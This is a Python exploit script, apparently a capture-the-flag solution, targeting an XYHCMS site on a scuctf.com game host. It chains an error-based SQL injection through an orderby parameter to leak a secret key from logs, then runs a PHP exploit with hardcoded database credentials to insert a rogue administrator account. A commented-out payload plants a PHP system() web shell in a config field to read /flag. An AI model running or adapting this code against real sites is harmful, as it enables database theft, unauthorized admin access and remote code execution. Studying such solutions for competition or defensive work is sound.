import requests
import re
import os
url = "http://a8ed7664-abef-46e1-a797-201a6639a962.game.scuctf.com:23333/"

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47'
}

def step1():
    url4secret = url+"index.php?s=/Api/Lt/alist&orderby[updatexml(1,concat(0x3a,(select s_value from xyh_config limit 6,1),0x3a),1);]=1"
    r = requests.get(url4secret)
    r= requests.get(url+"/App/Runtime/Logs/Api/22_05_23.log", headers=headers)
    r = re.findall("ERR: SQLSTATE\[HY000\]: General error: 1105 XPATH syntax error: ':(.*?):'",r.text)
    return r[0]

# /opt/homebrew/Cellar/php@7.4/7.4.27/bin/php

if __name__ == '__main__':
    key = step1()
    print(key)
    # 1读mysql密码/var/www/html/App/Common/Conf/db.php 2读缓存配置：/var/www/html/App/Common/Conf/config.php
    mysql_pass = "y4tacker492915"
    # os.system(f"/opt/homebrew/Cellar/php@7.4/7.4.27/bin/php exploit.php {url} 42.192.137.212 1237 root root '' {key}")
    payload = "INSERT INTO xyhcms.xyh_admin( id, username, password, encrypt, department, realname,email, user_type, login_time, login_ip, is_lock, login_num) VALUES (3, 'xyhcmss','cb2e734cb5ea80bbbdf697f1f65fcede', 'rRhpds', '', 'xxx', 'xxx@qq.com', 9, '2022-05-12 15:24:29', '', 0, 0);"
    gogogo = f"/opt/homebrew/Cellar/php@7.4/7.4.27/bin/php exploit.php {url} 127.0.0.1 3306 y4tacker {mysql_pass} \"{payload}\" {key}"
    os.system(gogogo)

    # payload= "UPDATE xyhcms.xyh_config SET name = 'SMS_SDK_TPL_ID', title = '短信模板ID', remark = '短信固 定模板ID', t_value = 'textarea', type_id = 5, group_id = 3, s_value = '<?php system(\\'cat /flag\\');?>', sort = 0 WHERE id = 77;"
    # print(payload);
    # gogogo = f"/opt/homebrew/Cellar/php@7.4/7.4.27/bin/php exploit.php {url} 127.0.0.1 3306 y4tacker {mysql_pass} \"{payload}\" {key}"
    # os.system(gogogo)
